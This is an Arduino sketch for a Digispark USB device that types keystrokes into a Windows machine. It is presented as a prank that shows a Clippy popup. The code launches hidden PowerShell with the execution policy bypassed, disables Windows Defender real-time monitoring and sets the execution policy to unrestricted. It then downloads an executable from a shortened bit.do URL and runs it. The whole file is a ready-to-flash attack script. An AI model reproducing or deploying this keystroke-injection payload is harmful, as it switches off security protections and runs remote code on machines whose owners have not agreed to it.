/*

Digispark

Upload .ino to Digispark

Payload: clippy.exe

Decsription: Uses powershell to download payload in "startup" folder. Powershell executes "clippy.exe" as administrator from webserver. Disables Windows Defender. 

"clippy.exe": Fun joke program creates an annoying Clippy/Clippit Office Assistant popup form Microsoft Word (version 97). Popup every 60 sec created by http://rjlpranks.com/pranks/clippy/ 

"clippy.vbs": Fake windows error to deter user from closing powershell (This is no longer included as powershell now runs hidden). 

Created by Tyler Smith on 9/2/2019 at [TIME] - http://DataDucks.3utilities.com/forum - DataDucks.Web.Development@gmail.com

Tested and Refined by Tyler Smith on 9/8/2019 at [10:42 AM]

Final Build on 9/8/2019 at 1:12 AM

Refined by Tyler Smith on 4/10/2020 at [1:25 PM]

Please see "clippy.txt" for list of phrases.

 */


 #include "DigiKeyboard.h"
 /* Init function */

    void setup() {
      // Don't need to set anything up to use DigiKeyboard
    }

    void loop() {
      // Turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
      pinMode(1, OUTPUT); //LED on Model A
      digitalWrite(1, HIGH);
      DigiKeyboard.delay(500);
      digitalWrite(1, LOW);
      DigiKeyboard.delay(2000);
      DigiKeyboard.sendKeyStroke(0);
      // Runing powershell through "RUN" with admin privlages, turn off windows defender, and set powerscript execution policy
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Opens up "RUN"
      DigiKeyboard.delay(100);
      // Runing powershell
      //DigiKeyboard.println(F("powershell")); // To see whats going on in powershell - uncomment to use WARNING: WILL NOT RUN ADMINISTRATOR MODE
      DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden - uncomment to use  
      DigiKeyboard.delay(2000);
      // Disable Windows Defender
      DigiKeyboard.println(F("Set-MpPreference -DisableRealtimeMonitoring $true"));
      DigiKeyboard.delay(100);
      // Allow scripts from interwebs to run (.ps1)
      DigiKeyboard.println(F("set-executionpolicy unrestricted"));
      DigiKeyboard.delay(100);
      // Accept
      DigiKeyboard.println(F("Y"));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Execute code from the interwebs modify 000.0.0.0 with your IP address (192.168.0.0, 127.0.0.1, etc.)
      DigiKeyboard.println(F("Invoke-WebRequest \"http://bit.do/clippy\" -OutFile \"clippy.exe\";Invoke-WebRequest \"http://bit.do/clippytxt\" -OutFile \"clippy.txt\""));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Execute clippy.exe
      DigiKeyboard.println(F("./clippy.exe"));
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Led on
      digitalWrite(1, HIGH);
  
      while(true){
        //do nothing
      }
    }
